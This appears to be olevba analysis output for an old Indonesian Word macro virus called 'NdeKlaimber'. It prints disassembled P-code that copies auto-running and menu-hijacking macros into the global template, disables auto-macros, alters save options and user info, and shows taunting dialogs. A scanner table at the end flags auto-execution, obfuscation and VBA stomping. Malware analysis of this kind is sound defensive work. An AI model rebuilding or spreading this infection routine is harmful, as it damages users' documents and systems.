' 	LitDI2 0x0001 
' 	ParamNamed Delete 
' 	Ld FN$ 
' 	ParamNamed Source 
' 	Ld i 
' 	ArgsLd BadMacro__$ 0x0001 
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0004 
' Line #26:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #27:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St NFile$ 
' Line #30:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":AutoExec"
' 	Add 
' 	St NMakro$ 
' Line #31:
' 	LitStr 0x000F "Global:AutoExec"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #32:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #33:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St NMakro$ 
' Line #34:
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #35:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #36:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":FileOpen"
' 	Add 
' 	St NMakro$ 
' Line #37:
' 	LitStr 0x000F "Global:FileOpen"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #38:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #39:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":FileSave"
' 	Add 
' 	St NMakro$ 
' Line #40:
' 	LitStr 0x000F "Global:FileSave"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #41:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #42:
' 	Ld NFile$ 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	St NMakro$ 
' Line #43:
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #44:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #45:
' 	Ld NFile$ 
' 	LitStr 0x000E ":FileTemplates"
' 	Add 
' 	St NMakro$ 
' Line #46:
' 	LitStr 0x0014 "Global:FileTemplates"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #47:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #48:
' 	Ld NFile$ 
' 	LitStr 0x000A ":FileMacro"
' 	Add 
' 	St NMakro$ 
' Line #49:
' 	LitStr 0x0010 "Global:FileMacro"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #50:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #51:
' 	Ld NFile$ 
' 	LitStr 0x000B ":ToolsMacro"
' 	Add 
' 	St NMakro$ 
' Line #52:
' 	LitStr 0x0011 "Global:ToolsMacro"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #53:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #54:
' 	Ld NFile$ 
' 	LitStr 0x000F ":ToolsCustomize"
' 	Add 
' 	St NMakro$ 
' Line #55:
' 	LitStr 0x0015 "Global:ToolsCustomize"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #56:
' 	Label Akhir 
' Line #57:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #58:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #59:
' 	EndSub 
' Macros/VBA/AutoOpen - 2566 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn NFile
' Line #3:
' 	Dim 
' 	VarDefn NMakro
' Line #4:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St NFile$ 
' Line #5:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #6:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":AutoExec"
' 	Add 
' 	St NMakro$ 
' Line #7:
' 	Ld NMakro$ 
' 	LitStr 0x000F "Global:AutoExec"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #8:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #9:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St NMakro$ 
' Line #10:
' 	Ld NMakro$ 
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #11:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #12:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":FileOpen"
' 	Add 
' 	St NMakro$ 
' Line #13:
' 	Ld NMakro$ 
' 	LitStr 0x000F "Global:FileOpen"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #14:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #15:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":FileSave"
' 	Add 
' 	St NMakro$ 
' Line #16:
' 	Ld NMakro$ 
' 	LitStr 0x000F "Global:FileSave"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #17:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #18:
' 	Ld NFile$ 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	St NMakro$ 
' Line #19:
' 	Ld NMakro$ 
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #20:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #21:
' 	Ld NFile$ 
' 	LitStr 0x000E ":FileTemplates"
' 	Add 
' 	St NMakro$ 
' Line #22:
' 	Ld NMakro$ 
' 	LitStr 0x0014 "Global:FileTemplates"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #23:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #24:
' 	Ld NFile$ 
' 	LitStr 0x000A ":FileMacro"
' 	Add 
' 	St NMakro$ 
' Line #25:
' 	Ld NMakro$ 
' 	LitStr 0x0010 "Global:FileMacro"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #26:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #27:
' 	Ld NFile$ 
' 	LitStr 0x000B ":ToolsMacro"
' 	Add 
' 	St NMakro$ 
' Line #28:
' 	Ld NMakro$ 
' 	LitStr 0x0011 "Global:ToolsMacro"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #29:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #30:
' 	Ld NFile$ 
' 	LitStr 0x000F ":ToolsCustomize"
' 	Add 
' 	St NMakro$ 
' Line #31:
' 	Ld NMakro$ 
' 	LitStr 0x0015 "Global:ToolsCustomize"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #32:
' 	Label Akhir 
' Line #33:
' 	EndSub 
' Macros/VBA/AutoExec - 5770 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn Tgl
' Line #3:
' 	Dim 
' 	VarDefn Bln
' Line #4:
' 	Dim 
' 	VarDefn Thn
' Line #5:
' 	Dim 
' 	VarDefn Jam
' Line #6:
' 	Dim 
' 	VarDefn Lebar
' Line #7:
' 	Dim 
' 	VarDefn Tinggi
' Line #8:
' 	Dim 
' 	VarDefn BarOK
' Line #9:
' 	Dim 
' 	VarDefn LebOK
' Line #10:
' 	Dim 
' 	VarDefn Pelaku
' Line #11:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall DisableInput 0x0001 
' Line #12:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #13:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Day 0x0001 
' 	St Tgl 
' Line #14:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Month 0x0001 
' 	St Bln 
' Line #15:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Year 0x0001 
' 	St Thn 
' Line #16:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Hour 0x0001 
' 	St Jam 
' Line #17:
' 	Dim 
' 	VarDefn Pesan1
' 	VarDefn Pesan2
' 	VarDefn Pesan3
' 	VarDefn Pesan4
' 	VarDefn Pelaku1
' 	VarDefn Pelaku2
' Line #18:
' 	LitStr 0x00A6 "Berawal dari sebuah kepedihan... NdeKlaimber™ dicampakkan dan dihinakan... terpuruk bagaikan sampah busuk... NdeKlaimber™ merintih dengan segumpal dendam mendidih !!!"
' 	St Pesan1$ 
' Line #19:
' 	LitStr 0x00F2 "Kini saatnya NdeKlaimber™ menunjukkan... masih adanya kekuatan untuk membungkam mulut-mulut tak berperasaan... sebab hasrat untuk menjadi yang terbaik adalah sesuatu yang sangat manusiawi... NdeKlaimber™ manangis harus melibatkan semua orang."
' 	St Pesan2$ 
' Line #20:
' 	LitStr 0x0031 "©1997 NdeKlaimber™                  I'm Coming..."
' 	St Pesan3$ 
' Line #21:
' 	LitStr 0x000B "NdeKlaimber"
' 	St Pelaku1$ 
' Line #22:
' 	LitStr 0x000D "Pakis Pratiwi"
' 	St Pelaku2$ 
' Line #23:
' 	Ld Thn 
' 	LitDI2 0x07CE 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	GoTo HUT 
' 	EndIf 
' Line #24:
' 	Ld Jam 
' 	LitDI2 0x0013 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	GoTo Akhir 
' 	EndIf 
' Line #25:
' 	Dim 
' 	VarDefn dlg (As Object)
' Line #26:
' 	LitDI2 0x0190 
' 	St Lebar 
' Line #27:
' 	LitDI2 0x00C8 
' 	St Tinggi 
' Line #28:
' 	Ld Tinggi 
' 	LitDI2 0x0019 
' 	Sub 
' 	St BarOK 
' Line #29:
' 	Ld Lebar 
' 	LitDI2 0x0028 
' 	Sub 
' 	St LebOK 
' Line #30:
' 	Ld Lebar 
' 	Ld Tinggi 
' 	LitStr 0x001A " NdeKlaimber Menggugat ..."
' 	Ld WordBasic 
' 	ArgsMemCall BeginDialog 0x0003 
' Line #31:
' 	LitDI2 0x0014 
' 	LitDI2 0x000A 
' 	Ld LebOK 
' 	LitDI2 0x0096 
' 	Ld Pesan1$ 
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0005 
' Line #32:
' 	LitDI2 0x0014 
' 	LitDI2 0x004E 
' 	Ld LebOK 
' 	LitDI2 0x0078 
' 	Ld Pesan2$ 
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0005 
' Line #33:
' 	LitDI2 0x0014 
' 	LitDI2 0x00A0 
' 	Ld LebOK 
' 	LitDI2 0x0014 
' 	Ld Pesan3$ 
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0005 
' Line #34:
' 	LitDI2 0x0014 
' 	Ld BarOK 
' 	Ld LebOK 
' 	LitDI2 0x0014 
' 	Ld WordBasic 
' 	ArgsMemCall OKButton 0x0004 
' Line #35:
' 	Ld WordBasic 
' 	ArgsMemCall EndDialog 0x0000 
' Line #36:
' 	SetStmt 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	MemLd UserDialog 
' 	Set dlg 
' Line #37:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall UserDialog 0x0001 
' Line #38:
' 	Label HUT 
' Line #39:
' 	Ld Tgl 
' 	LitDI2 0x0014 
' 	Eq 
' 	Ld Bln 
' 	LitDI2 0x000B 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #40:
' 	Ld Pelaku1$ 
' 	St Pelaku$ 
' Line #41:
' 	GoTo Ultah 
' Line #42:
' 	Ld Tgl 
' 	LitDI2 0x0013 
' 	Eq 
' 	Ld Bln 
' 	LitDI2 0x0008 
' 	Eq 
' 	And 
' 	ElseIfBlock 
' Line #43:
' 	Ld Pelaku2$ 
' 	St Pelaku$ 
' Line #44:
' 	GoTo Ultah 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	GoTo Lanjut 
' Line #47:
' 	Label Ultah 
' Line #48:
' 	LitStr 0x0009 "Hari ini "
' 	Ld Pelaku$ 
' 	Add 
' 	LitStr 0x007A " merayakan Hari Ulang Tahun... Matikan komputer, tinggalkan semua pekerjaan, istirahatkan pikiran, ucapkan selamat kepada "
' 	Add 
' 	Ld Pelaku$ 
' 	Add 
' 	LitStr 0x0001 "."
' 	Add 
' 	St Pesan4$ 
' Line #49:
' 	Ld WordBasic 
' 	ArgsMemCall Beep 0x0000 
' Line #50:
' 	Ld Pesan4$ 
' 	LitStr 0x0010 "Happy Birthday, "
' 	Ld Pelaku$ 
' 	Add 
' 	LitStr 0x0003 "..."
' 	Add 
' 	LitDI2 0x0010 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0003 
' Line #51:
' 	GoTo Ultah 
' Line #52:
' 	Label Lanjut 
' Line #53:
' 	LitDI2 0x0000 
' 	ParamNamed CreateBackup 
' 	LitDI2 0x0000 
' 	ParamNamed FastSaves 
' 	LitDI2 0x0000 
' 	ParamNamed SummaryPrompt 
' 	LitDI2 0x0000 
' 	ParamNamed GlobalDotPrompt 
' 	LitDI2 0x0000 
' 	ParamNamed NativePictureFormat 
' 	LitDI2 0x0000 
' 	ParamNamed EmbedFonts 
' 	LitDI2 0x0000 
' 	ParamNamed FormsData 
' 	LitDI2 0x0001 
' 	ParamNamed AutoSave 
' 	LitStr 0x0001 "5"
' 	ParamNamed SaveInterval 
' 	LitStr 0x0000 ""
' 	ParamNamed Password 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePassword 
' 	LitDI2 0x0000 
' 	ParamNamed RecommendReadOnly 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsOptionsSave 0x000C 
' Line #54:
' 	LitDI2 0x0001 
' 	ParamNamed Pagination 
' 	LitDI2 0x0000 
' 	ParamNamed WPHelp 
' 	LitDI2 0x0000 
' 	ParamNamed WPDocNavKeys 
' 	LitDI2 0x0000 
' 	ParamNamed BlueScreen 
' 	LitDI2 0x0001 
' 	ParamNamed ErrorBeeps 
' 	LitDI2 0x0001 
' 	ParamNamed Effects3d 
' 	LitDI2 0x0001 
' 	ParamNamed UpdateLinks 
' 	LitDI2 0x0001 
' 	ParamNamed SendMailAttach 
' 	LitDI2 0x0000 
' 	ParamNamed RecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed RecentFileCount 
' 	LitDI2 0x0001 
' 	ParamNamed Units 
' 	LitDI2 0x0001 
' 	UMi 
' 	ParamNamed ButtonFieldClicks 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsOptionsGeneral 0x000C 
' Line #55:
' 	LitStr 0x000D "Pakis Pratiwi"
' 	ParamNamed New 
' 	LitStr 0x0004 "Tiwi"
' 	ParamNamed Initials 
' 	LitStr 0x0024 "Pupus sudah asa NdeKlaimber™ mencari"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001E "Alamat nyata belum jua terberi"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001C "Kalau saudaraku sudi memberi"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001E "Informasi NdeKlaimber™ menanti"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0025 "Seribu hatur kasih NdeKlaimber™ pasti"
' 	Add 
' 	ParamNamed Address 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsOptionsUserInfo 0x0003 
' Line #56:
' 	Label Akhir 
' Line #57:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |N,"                 |Tiwi                                         |
|String    |                    |                                             |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

